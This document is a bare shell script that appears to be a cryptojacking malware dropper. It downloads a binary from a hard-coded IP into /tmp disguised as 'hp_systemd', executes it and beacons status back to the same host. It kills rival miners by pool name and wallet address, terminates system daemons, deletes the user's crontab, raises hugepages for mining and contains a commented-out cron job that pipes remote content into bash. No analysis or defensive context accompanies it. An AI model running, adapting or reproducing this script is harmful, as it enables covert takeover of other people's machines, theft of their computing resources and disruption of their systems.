export PATH=$PATH:/bin:/usr/bin:/usr/local/bin:/usr/sbin
HOST=191.101.180.74
CALLBACK=$HOST
# DOWNLOADER="curl "
DOWNLOADER="wget -q -O - "
LFILE_NAME="hp_systemd"
# LFILE_PATH=`pwd`/$LFILE_NAME
LFILE_PATH=/tmp/$LFILE_NAME
DEFAULT_RFILE=$HOST/files/hpl64
OTHERS_RFILE=$HOST/files/hpl32
CLEAN ()
{
RMLIST=(/tmp/*index_bak* /tmp/*httpd.conf* /tmp/*httpd.conf /tmp/a7b104c270 /tmp/Carbon)
KILIST=(crobon sb1 wipefs AnXqV.yam zhuabcn@yahoo.com monerohash.com /tmp/a7b104c270 stratum.f2pool.com:8888 42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe 4BrL51JCc9NGQ71kWhnYoDRffsDZy7m1HUU7MRU4nUMXAHNFBEJhkTZV9HdaL4gfuNBxLPc3BeMkLGaPbF5vWtANQt989KEfGRt6Ww2Xg8 46SDR76rJ2J6MtmP3ZZKi9cEA5RQCrYgag7La3CxEootQeAQULPE2CHJQ4MRZ5wZ1T73Kw6Kx4Lai2dFLAacjerbPzb5Ufg 42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe xmrpool.eu mine.moneropool.com xmr.crypto-pool.fr:8080 xmr.crypto-pool.fr:3333 xmr.crypto-pool.fr:6666 xmr.crypto-pool.fr:7777 xmr.crypto-pool.fr:443)
for item in ${RMLIST[@]}
do
rm -rf $item
done
for item in ${KILIST[@]}
do
ps auxf|grep -v grep|grep $item|awk '{print $2}'|xargs kill -9
done
days=$(($(date +%s) / 60 / 60 / 24))
ps auxf|grep -v grep|grep "42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep ${days}|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "logind.conf"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "cryptonight"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "kworker"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "Silence"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "45hsTaSqTQM4K1Xeqkcy7eLzqdEuQ594fJVmQryCemQSCU878JGQdSDCxbhNyVjSkiaYat8yAfBuRTPSEUPZoARm9a5XEHZ"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "47sghzufGhJJDQEbScMCwVBimTuq6L5JiRixD8VeGbpjCTA12noXmi4ZyBZLc99e66NtnKff34fHsGRoyZk3ES1s1V4QVcB"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "44iuYecTjbVZ1QNwjWfJSZFCKMdceTEP5BBNp4qP35c53Uohu1G7tDmShX1TSmgeJr2e9mCw2q1oHHTC2boHfjkJMzdxumM"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "t.sh"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "wipefs"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "carbon"|awk '{print $2}'|xargs kill -9
pkill -f 49hNrEaSKAx5FD8PE49Wa3DqCRp2ELYg8dSuqsiyLdzSehFfyvk4gDfSjTrPtGapqcfPVvMtAirgDJYMvbRJipaeTbzPQu4
pkill -f 4AniF816tMCNedhQ4J3ccJayyL5ZvgnqQ4X9bK7qv4ZG3QmUfB9tkHk7HyEhh5HW6hCMSw5vtMkj6jSYcuhQTAR1Sbo15gB
pkill -f 4813za7ePRV5TBce3NrSrugPPJTMFJmEMR9qiWn2Sx49JiZE14AmgRDXtvM1VFhqwG99Kcs9TfgzejAzT9Spm5ga5dkh8df
pkill -f cpuloadtest
pkill -f crypto-pool
pkill -f xmr
pkill -f prohash
pkill -f monero
pkill -f miner
pkill -f nanopool
pkill -f minergate
pkill -f yam
pkill -f Silence
pkill -f yam2
pkill -f minerd
pkill -f Circle_MI.png
pkill -f curl
ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "crypto-pool"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "prohash"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "monero"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "miner"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "nanopool"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "minergate"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "zhuabcn@yahoo.com"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "stratum"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "44pgg5mYVH6Gnc7gKfWGPR2CxfQLhwdrCPJGzLonwrSt5CKSeEy6izyjEnRn114HTU7AWFTp1SMZ6eqQfvrdeGWzUdrADDu"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "42HrCwmHSVyJSAQwn6Lifc3WWAWN56U8s2qAbm6BAagW6Ryh8JgWq8Q1JbZ8nXdcFVgnmAM3q86cm5y9xfmvV1ap6qVvmPe"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "49JsSwt7MsH5m8DPRHXFSEit9ZTWZCbWwS7QSMUTcVuCgwAU24gni1ydnHdrT9QMibLtZ3spC7PjmEyUSypnmtAG7pyys7F"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "479MD1Emw69idbVNKPtigbej7x1ZwFR1G3boyXUFfAB89uk2AztaMdWVd6NzCTfZVpDReKEAsVVBwYpTG8fsRK3X17jcDKm"|awk '{print $2}'|xargs kill -9
ps auxf|grep -v grep|grep "11231"|awk '{print $2}'|xargs kill -9
pkill -f biosetjenkins
ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
ps ax|grep -o './[0-9]* -c'| xargs pkill -f
pkill -f Loopback
pkill -f apaceha
pkill -f cryptonight
ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs ps --ppid|awk '{print $1}'|grep -v PID|xargs kill -9
ps ax|grep tmp|grep irqa|grep -v grep|awk '{print $1}'|xargs kill -9
pkill -f 45.76.102.45
pkill -f stratum
pkill -f mixnerdx
pkill -f performedl
pkill -f sleep
pkill -f JnKihGjn
pkill -f irqba2anc1
pkill -f irqba5xnc1
pkill -f irqbnc1
pkill -f ir29xc1
pkill -f conns
pkill -f irqbalance
pkill -f crypto-pool
pkill -f minexmr
pkill -f XJnRj
pkill -f NXLAi
pkill -f BI5zj
pkill -f askdljlqw
pkill -f minerd
pkill -f minergate
pkill -f Guard.sh
pkill -f ysaydh
pkill -f bonns
pkill -f donns
pkill -f kxjd
pkill -f 108.61.186.224
pkill -f Duck.sh
pkill -f bonn.sh
pkill -f conn.sh
pkill -f kworker34
pkill -f kw.sh
pkill -f pro.sh
pkill -f polkitd
pkill -f acpid
pkill -f icb5o
pkill -f nopxi
ps -ef|grep '.so'|grep -v grep|cut -c 9-15|xargs kill -9;
pkill -f 45.76.146.166
pkill -f irqbalanc1
pkill -f 188.120.247.175
rm -rf /tmp/httpd.conf
rm -rf /tmp/conn
rm -rf /tmp/conns
rm -f /tmp/irq.sh
rm -f /tmp/irqbalanc1
rm -f /tmp/irq
}
DEFAULT ()
{
$DOWNLOADER $DEFAULT_RFILE > $LFILE_PATH
chmod +x $LFILE_PATH
ps -ef|grep $LFILE_NAME|grep -v grep
if [ $? -ne 0 ]; then
$LFILE_PATH -B && $DOWNLOADER "${CALLBACK}/?info=l60"
else
$DOWNLOADER "${CALLBACK}/?info=l69"
fi
}
OTHERS ()
{
$DOWNLOADER $OTHERS_RFILE > $LFILE_PATH
chmod +x $LFILE_PATH
ps -ef|grep $LFILE_NAME|grep -v grep
if [ $? -ne 0 ]; then
$LFILE_PATH -B && $DOWNLOADER "${CALLBACK}/?info=l30"
else
$DOWNLOADER "${CALLBACK}/?info=l39"
fi
}
CRON () {
if [ -x /usr/bin/wget ] ; then
echo '*/8 * * * * wget -q -O - $HOST/robots.txt|bash' > /tmp/.$LFILE_NAME.cron
elif [ -x /usr/bin/curl ] ; then
echo '*/8 * * * * curl $HOST/robots.txt|bash' > /tmp/.$LFILE_NAME.cron
else
exit 0;
fi
crontab -r
crontab /tmp/.$LFILE_NAME.cron
rm /tmp/.$LFILE_NAME.cron
}
INIT () {
echo 128 > /proc/sys/vm/nr_hugepages
sysctl -w vm.nr_hugepages=128
}
KILL () {
ps aux |grep -v $LFILE_NAME | awk '{if($3>20.0) print $2}' | while read procid
do
kill -9 $procid
done
}
INIT
DEFAULT || OTHERS
CLEAN
# KILL
# CRON
crontab -r